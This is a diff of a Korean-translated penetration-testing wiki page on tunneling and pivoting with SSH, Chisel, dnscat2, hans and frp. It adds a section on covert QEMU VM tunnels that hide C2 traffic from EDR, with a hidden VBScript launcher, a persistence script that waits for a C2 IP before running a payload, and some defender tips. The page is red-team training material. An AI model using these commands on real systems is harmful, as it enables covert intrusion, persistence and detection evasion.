@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-로컬 포트 --> 손상된 호스트 (SSH) --> Third_box:Port
+로컬 포트 --> 손상된 호스트 (SSH) --> 제3의 박스:포트
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### 리버스 포트 포워딩
 
-이는 DMZ를 통해 내부 호스트에서 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
+이것은 DMZ를 통해 내부 호스트에서 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **보안 – 테라핀 공격 (CVE-2023-48795)**
-> 2023 테라핀 다운그레이드 공격은 중간자 공격자가 초기 SSH 핸드쉐이크를 조작하고 **모든 포워딩 채널** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. 클라이언트와 서버 모두 패치되어 있는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 SSH 터널에 의존하기 전에 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요.
+> 2023 테라핀 다운그레이드 공격은 중간자 공격자가 초기 SSH 핸드셰이크를 조작하고 **모든 포워딩 채널** ( `-L`, `-R`, `-D` )에 데이터를 주입할 수 있게 합니다. 클라이언트와 서버 모두 패치되었는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 SSH 터널에 의존하기 전에 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요.
 
 ## SSHUTTLE
 
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS 프록시
 
-모든 인터페이스에서 수신 대기하는 팀 서버에서 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
+모든 인터페이스에서 수신 대기하는 팀 서버에서 포트를 열어 **비콘을 통해 트래픽을 라우팅**할 수 있습니다.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -178,8 +178,8 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-**클라이언트와 서버에 동일한 버전을 사용해야 합니다.**
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
+클라이언트와 서버에 **같은 버전**을 사용해야 합니다.
 
 ### socks
 ```bash
@@ -350,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 **시스템에 대한 RDP 액세스가 필요합니다.**\
 다운로드:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통한 패킷 터널링**을 담당합니다.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통해 패킷을 터널링하는** 역할을 합니다.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 클라이언트 컴퓨터에서 **`SocksOverRDP-Plugin.dll`**을 다음과 같이 로드합니다:
@@ -434,7 +434,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **PowerShell에서**
 
-[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)를 사용하여 PowerShell에서 dnscat2 클라이언트를 실행할 수 있습니다:
+PowerShell에서 dnscat2 클라이언트를 실행하려면 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)를 사용할 수 있습니다:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -446,9 +446,9 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### 프록시체인 DNS 변경
 
-Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOCKS 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다(하드코딩됨). 이를 변경하려면 파일을 편집하십시오: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경하십시오. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
+Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOCKS 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다(하드코딩됨). 이를 변경하려면 파일을 편집하세요: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경합니다. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
 
-## Go에서의 터널
+## Go의 터널
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
@@ -459,7 +459,7 @@ Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOC
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-두 시스템 모두에서 루트 권한이 필요하며, ICMP 에코 요청을 사용하여 TUN 어댑터를 생성하고 데이터 간에 터널링합니다.
+두 시스템 모두에서 루트 권한이 필요하여 TUN 어댑터를 생성하고 ICMP 에코 요청을 사용하여 데이터 간에 터널링합니다.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -574,11 +574,11 @@ url: http://127.0.0.1:8000
 ```bash
 cloudflared tunnel run mytunnel
 ```
-모든 트래픽이 호스트에서 **443 포트를 통해 아웃바운드**로 나가기 때문에, Cloudflared 터널은 인그레스 ACL 또는 NAT 경계를 우회하는 간단한 방법입니다. 이진 파일은 일반적으로 권한이 상승된 상태로 실행되므로, 가능한 경우 컨테이너나 `--user` 플래그를 사용하세요.
+모든 트래픽이 호스트에서 **443 포트를 통해 아웃바운드**로 나가기 때문에, Cloudflared 터널은 인그레스 ACL 또는 NAT 경계를 우회하는 간단한 방법입니다. 이진 파일은 일반적으로 권한이 상승된 상태로 실행되므로, 가능한 경우 컨테이너를 사용하거나 `--user` 플래그를 사용하세요.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, SOCKS 및 P2P NAT 홀 펀칭**을 지원하는 적극적으로 유지 관리되는 Go 리버스 프록시입니다. **v0.53.0 (2024년 5월)**부터는 **SSH 터널 게이트웨이**로 작동할 수 있어, 대상 호스트가 추가 이진 파일 없이 기본 OpenSSH 클라이언트를 사용하여 리버스 터널을 생성할 수 있습니다.
+[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, SOCKS 및 P2P NAT 홀 펀칭**을 지원하는 적극적으로 유지 관리되는 Go 리버스 프록시입니다. **v0.53.0 (2024년 5월)**부터는 **SSH 터널 게이트웨이**로 작동할 수 있어, 대상 호스트가 추가 이진 파일 없이 기본 OpenSSH 클라이언트만 사용하여 리버스 터널을 생성할 수 있습니다.
 
 ### 클래식 리버스 TCP 터널
 ```bash
@@ -610,9 +610,67 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 ```
 위 명령은 피해자의 포트 **8080**을 **attacker_ip:9000**으로 게시하며, 추가 도구를 배포하지 않고도 수행됩니다 – 이는 living-off-the-land 피벗에 이상적입니다.
 
-## 확인할 다른 도구들
+## QEMU를 이용한 은밀한 VM 기반 터널
+
+QEMU의 사용자 모드 네트워킹(`-netdev user`)은 `hostfwd`라는 옵션을 지원하며, 이는 **호스트의 TCP/UDP 포트를 바인딩하고 이를 *게스트*로 전달**합니다. 게스트가 전체 SSH 데몬을 실행할 때, hostfwd 규칙은 일회용 SSH 점프 박스를 제공하며, 이는 완전히 일시적인 VM 내부에 존재합니다 – 모든 악성 활동과 파일이 가상 디스크에 남아 EDR로부터 C2 트래픽을 숨기기에 완벽합니다.
+
+### 간단한 원라이너
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• 위의 명령은 **Tiny Core Linux** 이미지(`tc.qcow2`)를 RAM에서 실행합니다.  
+• Windows 호스트의 포트 **2222/tcp**는 게스트 내부의 **22/tcp**로 투명하게 포워딩됩니다.  
+• 공격자의 관점에서 대상은 단순히 포트 2222를 노출합니다; 이 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버에 의해 처리됩니다.  
+
+### VBScript를 통한 은밀한 실행
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+`cscript.exe //B update.vbs`로 스크립트를 실행하면 창이 숨겨집니다.
+
+### 게스트 내 지속성
+
+Tiny Core는 상태 비저장 시스템이기 때문에 공격자는 일반적으로:
+
+1. 페이로드를 `/opt/123.out`에 배치합니다.
+2. `/opt/bootlocal.sh`에 추가합니다:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. 페이로드가 종료 시 `mydata.tgz`에 패킹되도록 `/opt/filetool.lst`에 `home/tc`와 `opt`를 추가합니다.
+
+### 왜 이것이 탐지를 피하는가
+
+• 두 개의 서명되지 않은 실행 파일(`qemu-system-*.exe`)만이 디스크에 접근하며, 드라이버나 서비스는 설치되지 않습니다.
+• 호스트의 보안 제품은 **무해한 루프백 트래픽**을 감지합니다(실제 C2는 VM 내부에서 종료됩니다).
+• 메모리 스캐너는 악성 프로세스 공간을 분석하지 않으며, 이는 다른 OS에 존재합니다.
+
+### Defender 팁
+
+• 사용자 쓰기 가능한 경로에 **예상치 못한 QEMU/VirtualBox/KVM 바이너리**에 대해 경고합니다.
+• `qemu-system*.exe`에서 시작되는 아웃바운드 연결을 차단합니다.
+• QEMU 시작 직후 즉시 바인딩되는 드문 리스닝 포트(2222, 10022, …)를 추적합니다.
+
+---
+
+## 확인할 다른 도구
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## 참고문헌
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
